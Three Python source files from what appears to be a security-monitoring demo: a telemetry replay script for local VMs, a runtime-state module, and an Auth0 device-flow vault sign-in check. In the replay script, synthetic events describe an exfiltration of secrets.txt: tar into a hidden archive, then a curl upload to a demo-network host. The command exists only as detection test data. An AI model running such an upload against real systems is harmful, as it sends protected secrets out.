#!/usr/bin/env python3
"""Replay synthetic Sentinel telemetry on the local Multipass demo network."""

import argparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
import json
import re
import socket
import subprocess
import sys
import time
from urllib.request import Request, urlopen
from uuid import uuid4


NODES = ("vm-a", "vm-b", "vm-c")
INGEST = "http://10.97.0.1:8001/events"
API = "http://127.0.0.1:8000"
VM_SCRIPT = "/home/ubuntu/sentinel-replay"


def fixture_events(node, run_id):
    archive = f"/tmp/.cache-bundle-{node}-{run_id[-12:]}.tgz"
    protected_file = "/srv/sensitive_data/secrets.txt"
    dest = "10.97.0.1:8443"
    upload = f"curl --data-binary @{archive} http://{dest}/upload"
    return (
        ("file", {"op": "access_granted", "path": protected_file,
                  "resource": "demo-vault", "reason": "verified_token"}),
        ("file", {"op": "create", "path": archive, "bytes": 169, "hidden_dotfile": True}),
        ("process", {"cmd": f"tar -czf {archive} secrets.txt", "source": "bash_history", "parent": "bash"}),
        ("process", {"cmd": upload, "source": "bash_history", "parent": "bash"}),
        ("network", {"dst": dest, "proto": "HTTP", "bytes_out": 169,
                     "internal": False, "unapproved_egress": True, "cmd": upload}),
    )


def send_from_vm(node, run_id):
    sent = 0
    for channel, payload in fixture_events(node, run_id):
        request = Request(INGEST, data=json.dumps({
            "schema_version": 1,
            "run_id": run_id,
            "event_id": f"evt-{uuid4().hex}",
            "source_id": node,
            "channel": channel,
            "event_time": datetime.now(timezone.utc).isoformat(),
            "payload": payload,
        }).encode(), headers={"Content-Type": "application/json"})
        with urlopen(request, timeout=5) as response:
            if response.status != 201:
                raise RuntimeError(f"{node}: ingest returned HTTP {response.status}")
        sent += 1
        time.sleep(0.06)
    print(f"{node}: sent {sent} synthetic events ({run_id})", flush=True)


def get_json(path, *, method="GET", timeout=5):
    with urlopen(Request(API + path, method=method), timeout=timeout) as response:
        return json.load(response)


def replay_from_host(nodes, *, reset):
    health = get_json("/health")
    print(f"Live VEGA: {health['reasoner_mode']} / {health['stream_backend']}", flush=True)
    if reset:
        if get_json("/api/demo/reset", method="POST")["status"] != "reset":
            raise RuntimeError("VEGA did not confirm the demo reset")
        print("Demo reset to WATCH.", flush=True)
    run_id = "synthetic-e2e-" + uuid4().hex[:12]

    def trigger(node):
        reply = subprocess.run(
            ["multipass", "exec", node, "--", VM_SCRIPT, "--run-id", run_id],
            text=True, capture_output=True, timeout=35,
        )
        print(reply.stdout.strip() or f"{node}: no replay output", flush=True)
        if reply.returncode:
            raise RuntimeError(f"{node}: {reply.stderr.strip() or 'VM replay failed'}")

    with ThreadPoolExecutor(max_workers=len(nodes)) as pool:
        list(pool.map(trigger, nodes))
    print("Closing the current window and waiting for Sentinel…", flush=True)
    result = get_json("/api/demo/flush-window?wait=true", method="POST", timeout=75)
    window = result["window_id"]
    signal = result.get("council_signal") or {}
    state = get_json("/api/state")
    event_ids = {node: set() for node in nodes}
    for event in state["events"]:
        if event["run_id"] == run_id and event["source_id"] in event_ids:
            event_ids[event["source_id"]].add(event["event_id"])
    channels = {node: set() for node in nodes}
    cited_channels = {node: set() for node in nodes}
    cited_findings = set(signal.get("finding_refs", []))
    for finding in state["findings"]:
        node = finding["source_id"]
        if finding["window_id"] != window or node not in channels:
            continue
        if event_ids[node].intersection(finding["evidence_event_ids"]):
            channels[node].add(finding["channel"])
            if finding["finding_id"] in cited_findings:
                cited_channels[node].add(finding["channel"])
    print(f"{window}: {result['status']} ({result['findings_count']} findings); VEGA mode: {state['threat_mode']}")
    for node in nodes:
        print(f"  {node}: {', '.join(sorted(channels[node])) or 'no findings for this replay'}")
    if not signal:
        print("No Council signal for this window.")
        return 1
    sources = set(signal["source_ids"])
    print(f"Council: {signal['severity']} — {', '.join(sorted(sources))}")
    if signal["severity"] != "SEV1" or not set(nodes) <= sources:
        return 1
    if any(len(cited_channels[node]) < 2 for node in nodes):
        print("Council did not cite at least two replay channels for every selected node.")
        return 1
    return 0


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("nodes", nargs="*", metavar="VM", help="Host only: VM targets (default: vm-a vm-b)")
    parser.add_argument("--reset", action="store_true", help="Host only: clear existing demo telemetry and state first")
    parser.add_argument("--run-id", help=argparse.SUPPRESS)
    args = parser.parse_args()
    node = socket.gethostname()
    try:
        if node in NODES:
            if args.nodes or args.reset:
                parser.error("on a VM, run the replay without target or reset arguments")
            run_id = args.run_id or "synthetic-e2e-" + uuid4().hex[:12]
            if not re.fullmatch(r"synthetic-e2e-[a-f0-9]{12}", run_id):
                parser.error("invalid synthetic run ID")
            send_from_vm(node, run_id)
            return 0
        if args.run_id:
            parser.error("--run-id is only used on the demo VMs")
        nodes = tuple(dict.fromkeys(args.nodes)) or NODES[:2]
        if not set(nodes) <= set(NODES):
            parser.error("select vm-a, vm-b, or vm-c")
        return replay_from_host(nodes, reset=args.reset)
    except (OSError, ValueError, KeyError, RuntimeError, subprocess.TimeoutExpired) as exc:
        print(f"Demo could not complete: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())

"""Central runtime state, preserved evidence snapshots, and SSE broadcaster."""

from __future__ import annotations

import asyncio
import json
from collections.abc import Iterable
from datetime import datetime, timedelta, timezone
from typing import Any

from .config import settings
from .models import (
    CouncilSignal,
    MonitoredNode,
    NetworkEdge,
    OracleAssessment,
    ScoutFinding,
    StateSnapshot,
    StoredEvent,
    ThreatMode,
    WardenAuditEntry,
    WardenDecision,
    Window,
)


def default_nodes() -> list[MonitoredNode]:
    return [
        MonitoredNode(
            source_id="vega-core",
            pseudonym="cluster-hub",
            role="VEGA Ingest & Swarm Hub",
            cluster="core",
            identity_sealed=False,
        ),
    ]


def default_edges() -> list[NetworkEdge]:
    return []


class VegaRuntimeState:
    def __init__(self) -> None:
        self._subscribers: set[asyncio.Queue[str]] = set()
        self.reset()

    def reset(self) -> None:
        now = datetime.now(timezone.utc)
        self.threat_mode: ThreatMode = "WATCH"
        self.nodes: list[MonitoredNode] = default_nodes()
        self.edges: list[NetworkEdge] = default_edges()
        self.windows: list[Window] = [
            Window(
                id="W-1000",
                start=now,
                end=now + timedelta(seconds=settings.window_seconds),
                status="collecting",
            )
        ]
        self.active_window_id: str = "W-1000"
        self.events: list[StoredEvent] = []
        self.findings: list[ScoutFinding] = []
        self.council_signal: CouncilSignal | None = None
        self.window_signals: dict[str, CouncilSignal] = {}
        self.oracle_assessment: OracleAssessment | None = None
        self.warden_decision: WardenDecision | None = None
        self.preserved_evidence: dict[str, StoredEvent] = {}
        self.oldest_stream_event_at: datetime | None = None

    def compute_ttl_seconds_remaining(self, now: datetime | None = None) -> int:
        if self.oldest_stream_event_at is None:
            return settings.retention_seconds
        current = now or datetime.now(timezone.utc)
        expires_at = self.oldest_stream_event_at + timedelta(seconds=settings.retention_seconds)
        return max(0, int((expires_at - current).total_seconds()))

    def snapshot(self) -> StateSnapshot:
        return StateSnapshot(
            threat_mode=self.threat_mode,
            active_window_id=self.active_window_id,
            ttl_seconds_remaining=self.compute_ttl_seconds_remaining(),
            nodes=self.nodes,
            edges=self.edges,
            windows=self.windows,
            events=self.visible_events(),
            findings=self.findings,
            council_signal=self.council_signal,
            oracle_assessment=self.oracle_assessment,
            warden_decision=self.warden_decision,
        )

    def record_event(self, event: StoredEvent) -> None:
        self.events.append(event)
        if len(self.events) > 500:
            self.events = self.events[-500:]
        if self.oldest_stream_event_at is None or event.ingested_at < self.oldest_stream_event_at:
            self.oldest_stream_event_at = event.ingested_at
        if not any(n.source_id == event.source_id for n in self.nodes):
            role = str(event.payload.get("host_role") or "Monitored Endpoint")
            self.nodes.append(
                MonitoredNode(
                    source_id=event.source_id,
                    pseudonym=f"subj-{len(self.nodes):03d}",
                    role=role,
                    cluster="eng",
                )
            )
            self.edges.append(
                NetworkEdge(
                    id=f"e-core-{event.source_id}",
                    **{"from": event.source_id, "to": "vega-core"},
                    channel=event.channel,
                )
            )
        else:
            for node in self.nodes:
                if node.source_id == event.source_id:
                    node.heartbeat_age_sec = 0
                    break

    def visible_events(self) -> list[StoredEvent]:
        # Keep incident evidence visible after removing it from the rolling telemetry buffer.
        visible = {ev.event_id: ev for ev in self.events[-200:]}
        visible.update(self.preserved_evidence)
        return sorted(visible.values(), key=lambda ev: ev.ingested_at)

    def preserve_evidence(self, event_ids: list[str], events: Iterable[StoredEvent]) -> None:
        wanted = set(event_ids)
        self.preserved_evidence.update((ev.event_id, ev) for ev in events if ev.event_id in wanted)

    async def clear_window_context(self, window: Window) -> None:
        self.events = [ev for ev in self.events if not window.start <= ev.ingested_at < window.end]
        # Replace stale queued raw telemetry with the authoritative snapshot for live clients.
        for queue in self._subscribers:
            while not queue.empty():
                queue.get_nowait()
        await self.publish("snapshot", self.snapshot())

    def append_warden_audit(self, entry: WardenAuditEntry) -> None:
        if self.warden_decision is None:
            return
        self.warden_decision.audit_log.append(entry)

    def subscribe(self) -> asyncio.Queue[str]:
        q: asyncio.Queue[str] = asyncio.Queue(maxsize=200)
        self._subscribers.add(q)
        return q

    def unsubscribe(self, q: asyncio.Queue[str]) -> None:
        self._subscribers.discard(q)

    async def publish(self, event_type: str, payload: Any) -> None:
        if hasattr(payload, "model_dump"):
            data = payload.model_dump(mode="json", by_alias=True)
        else:
            data = payload
        frame = f"event: {event_type}\ndata: {json.dumps(data)}\n\n"
        for q in list(self._subscribers):
            if q.full():
                try:
                    q.get_nowait()
                except asyncio.QueueEmpty:
                    pass
            await q.put(frame)

"""Test employee sign-in from a headless VM with Auth0 Device Flow."""

import argparse
from http.client import HTTPConnection
import json
import os
from pathlib import Path
import re
import sys
import time
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urlsplit
from urllib.request import Request, urlopen


DEVICE_GRANT = "urn:ietf:params:oauth:grant-type:device_code"
VAULT_ROUTE = "/v1/files/secrets.txt"


def auth_request(issuer, path, *, fields=None, bearer=None):
    request = Request(
        issuer + path,
        data=urlencode(fields).encode() if fields is not None else None,
        headers={"Authorization": f"Bearer {bearer}"} if bearer is not None else {},
    )
    try:
        with urlopen(request, timeout=8) as response:
            return response.status, json.load(response)
    except HTTPError as error:
        with error:
            try:
                return error.code, json.load(error)
            except ValueError:
                return error.code, {}


def vault_request(port, bearer=None):
    # Fixed loopback destination; never forward a vault token through a proxy or redirect.
    connection = HTTPConnection("127.0.0.1", port, timeout=10)
    try:
        headers = {"Authorization": f"Bearer {bearer}"} if bearer else {}
        connection.request("GET", VAULT_ROUTE, headers=headers)
        result = connection.getresponse()
        return result.status, result.read(64 * 1024)
    finally:
        connection.close()


def login(issuer, client_id, *, audience=None, vault_port=None, output=None):
    fields = {"client_id": client_id, "scope": "openid"}
    if vault_port is not None:
        status, _ = vault_request(vault_port)
        if status != 401:
            print(f"Expected a sign-in challenge from the local vault (got HTTP {status}); stopping.")
            return 1
        print("Sign in with Auth0 to open the vault.", flush=True)
        fields.update(audience=audience, scope="openid read:vault")
    status, device = auth_request(issuer, "/oauth/device/code", fields=fields)
    if status != 200:
        if audience and device.get("error_description") == f"Service not found: {audience}":
            print(f"Auth0 has not registered the vault API ({audience}). Register it before signing in.", file=sys.stderr)
        else:
            print(f"Could not start device login (HTTP {status}, {device.get('error', 'unknown error')}).", file=sys.stderr)
        return 1

    verification_uri = device["verification_uri"]
    uri = urlsplit(verification_uri)
    if (uri.scheme, uri.netloc) != ("https", urlsplit(issuer).netloc):
        print("Unexpected Auth0 verification URL; stopping.", file=sys.stderr)
        return 1

    lifetime = int(device["expires_in"])
    deadline = time.monotonic() + lifetime
    interval = max(1, int(device.get("interval", 5)))
    print(f"On your laptop, open {verification_uri} in a private browser window.", flush=True)
    print(f"Enter code {device['user_code']} and sign in as the test employee.", flush=True)
    print(f"Waiting for Auth0 (up to {lifetime // 60} min). Press Ctrl+C to stop.", flush=True)

    while time.monotonic() + interval < deadline:
        time.sleep(interval)
        try:
            status, result = auth_request(issuer, "/oauth/token", fields={
                "client_id": client_id,
                "device_code": device["device_code"],
                "grant_type": DEVICE_GRANT,
            })
        except (URLError, TimeoutError):
            interval = min(60, max(5, interval * 2))
            continue

        access_token = REDACTED
        if status == 200 and access_token:
            if vault_port is not None:
                vault_status, body = vault_request(vault_port, bearer=access_token)
                if vault_status == 200:
                    if output is None:
                        print("Vault access granted (HTTP 200):")
                        print(body.decode("utf-8", errors="replace"), end="")
                    else:
                        fd = os.open(output, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
                        with os.fdopen(fd, "wb") as file:
                            file.write(body)
                        print(f"Vault access granted (HTTP 200). Saved to {output}.")
                    return 0
                print(f"Vault did not return the file (HTTP {vault_status}): {body.decode('utf-8', errors='replace').strip()}")
                return 1
            profile_status, profile = auth_request(issuer, "/userinfo", bearer=access_token)
            if profile_status == 200 and isinstance(profile.get("sub"), str):
                print(f"Sign-in succeeded: Auth0 issued a token. User ID: {profile['sub']!r}")
                return 0
            print(f"Auth0 issued a token, but /userinfo did not verify an account (HTTP {profile_status}).")
            return 1
        error = result.get("error")
        if error == "slow_down" or status == 429:
            interval += 5
        elif error == "expired_token":
            break
        elif error != "authorization_pending":
            print(f"No token issued (Auth0 HTTP {status}, {error or 'unknown error'}).")
            return 1

    print("Device code expired without a token. Expiry alone does not prove the account is blocked.")
    return 1


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--domain", required=True, help="Auth0 tenant hostname")
    parser.add_argument("--client-id", required=True, help="Native application's Client ID (not Warden's)")
    parser.add_argument("--vault-port", type=int, help="Read secrets.txt through the loopback vault at this port")
    parser.add_argument("--audience", help="Auth0 custom API identifier for the vault")
    parser.add_argument("--output", type=Path, help="Save the authenticated file to a new local path")
    args = parser.parse_args()
    if args.output is not None and args.vault_port is None:
        parser.error("--output requires --vault-port")
    if (args.vault_port is None) != (args.audience is None):
        parser.error("--vault-port and --audience must be supplied together")
    if args.vault_port is not None and not 1 <= args.vault_port <= 65535:
        parser.error("invalid --vault-port")
    if not re.fullmatch(r"[a-z0-9-]+(?:\.[a-z0-9-]+)*\.auth0\.com", args.domain):
        parser.error("--domain must be an Auth0 hostname ending in .auth0.com")
    try:
        return login(f"https://{args.domain}", args.client_id, audience=args.audience, vault_port=args.vault_port, output=args.output)
    except FileExistsError:
        print("Output file already exists; refusing to overwrite it.", file=sys.stderr)
        return 1
    except (OSError, ValueError, KeyError) as error:
        print(f"Could not complete the Auth0 sign-in check ({type(error).__name__}).", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("\nStopped waiting for Auth0.")
        return 130


if __name__ == "__main__":
    sys.exit(main())

